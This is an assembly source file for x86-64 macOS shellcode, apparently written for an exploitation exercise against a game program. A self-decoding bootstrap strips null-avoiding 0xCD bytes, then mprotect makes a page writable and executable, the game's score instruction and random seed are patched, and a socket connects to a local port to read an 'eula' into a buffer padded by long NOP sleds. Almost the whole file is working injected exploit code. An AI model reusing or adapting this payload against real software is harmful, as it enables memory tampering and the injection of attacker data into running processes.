.text
.globl _main
_main:
        movabsq $0x1111111111111111, %rax
        movabsq $0x1111111111107E26, %rcx # result of sub is address of first byte past bootstrap code
        subq %rcx, %rax
        mov %rax, %rdx
        mov $0xFFFF, %dx
        sub $0xFFFF, %dx # zero dx without getting a null in machine code 
# loop starts here
        cmpb $0xCD, (%rax)
        jne .+6 # %rbx # 1
        subb $0xCD, (%rax)
# jump to here if not == 0xcd
        add $0x1, %rax
        add $0x1, %dx
        cmp $0x3D0, %dx # 1035 bytes total, 59 bytes for bootstrap, decode next 976 bytes
        jb .-21
        nop
        nop
        nop
        nop
        nop
        nop
        movl $0x200004A, %eax # 4A is the mprotect syscall
        movabsq $0x0000000000004000, %rdi # first arg is page addr, this is the addr of tick
        movq $4096, %rsi # second arg is len, we want 1 page
        movq $7, %rdx # third arg - PROT_READ 0x1 | PROT_WRITE 0x2 | PROT_EXEC 0x4   - 0111
        syscall
        movabsq $0x000000000000419B, %rax # move location of score add instruction to rax
        movb $0x0F, (%rax)
        nop
        movabsq $0x00000000000096b0, %rax 
        movq $42, (%rax) # write 42 back to the random seed var
        # now download the real eula 
        nop
        movl $0x2000061, %eax #  61 is socket
        movq $2, %rdi # first socket arg - AF_INET
        movq $1, %rsi # second socket arg - SOCK_STREAM
        movq $0, %rdx # third socket arg - protocol
        syscall # call socket, socket handle in eax
        movq %rax, %rdi # move socket handle to ebx
        movl $0x2000062, %eax # next syscall will be to connect
        movabsq $0x00000000000096a1, %rsi
        movb $2, (%rsi)
        add $1, %rsi
        movb $0x27, (%rsi)
        add $1, %rsi
        movb $0x15, (%rsi)
        add $1, %rsi
        movq $0x7f, (%rsi)
        add $3, %rsi
        movq $1, (%rsi)
        movabsq $0x00000000000096a0, %rsi # second arg to connect is address of sockaddr struct, located in our buffer (pre-zeroed by bootstrap)
        movq $16, %rdx # third arg is len of sockaddr
        syscall
        
        # 50 bytes nop
        nop # add nops to fill space so that when we write the eula string to this buffer it doesn't overwrite ret 
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

         # 50 bytes nop
        nop # add nops to fill space so that when we write the eula string to this buffer it doesn't overwrite ret 
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        # 50 bytes nop
        nop # add nops to fill space so that when we write the eula string to this buffer it doesn't overwrite ret 
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        # 50 bytes nop
        nop # add nops to fill space so that when we write the eula string to this buffer it doesn't overwrite ret 
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        # 50 bytes nop
        nop # add nops to fill space so that when we write the eula string to this buffer it doesn't overwrite ret 
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        # 50 bytes nop
        nop # add nops to fill space so that when we write the eula string to this buffer it doesn't overwrite ret 
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        # 50 bytes nop
        nop # add nops to fill space so that when we write the eula string to this buffer it doesn't overwrite ret 
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        # 50 bytes nop
        nop # add nops to fill space so that when we write the eula string to this buffer it doesn't overwrite ret 
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        # 50 bytes nop
        nop # add nops to fill space so that when we write the eula string to this buffer it doesn't overwrite ret 
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        # 50 bytes nop
        nop # add nops to fill space so that when we write the eula string to this buffer it doesn't overwrite ret 
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        # 50 bytes nop
        nop # add nops to fill space so that when we write the eula string to this buffer it doesn't overwrite ret 
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        # 50 bytes nop
        nop # add nops to fill space so that when we write the eula string to this buffer it doesn't overwrite ret 
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        # 50 bytes nop
        nop # add nops to fill space so that when we write the eula string to this buffer it doesn't overwrite ret 
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

        # 50 bytes nop
        nop # add nops to fill space so that when we write the eula string to this buffer it doesn't overwrite ret 
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        
        movl $0x200001D, %eax # next syscall will be to recvfrom
        movabsq $0x00000000000092b0, %rsi # second arg is address of this buffer
        movq $512, %rdx # third arg is len, eula will be up to 512 bytes 
        movq $0x0, %r10 # fourth arg is flags
        movq $0x0, %r8 # fifth arg is socket ptr, but null since we have a connected socket
        movq $0x0, %r9 # ignore 
        syscall
        ret 

        # 43 NOPS - code is exactly 1024 bytes long, need space for sockaddr
        nop # note that these were manually changed to 0xCD so that they'd be null
        nop # at program time
        nop
        nop # I also don't think this adds up to 1024 bytes exactly any more, I added pading manually
        nop 
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop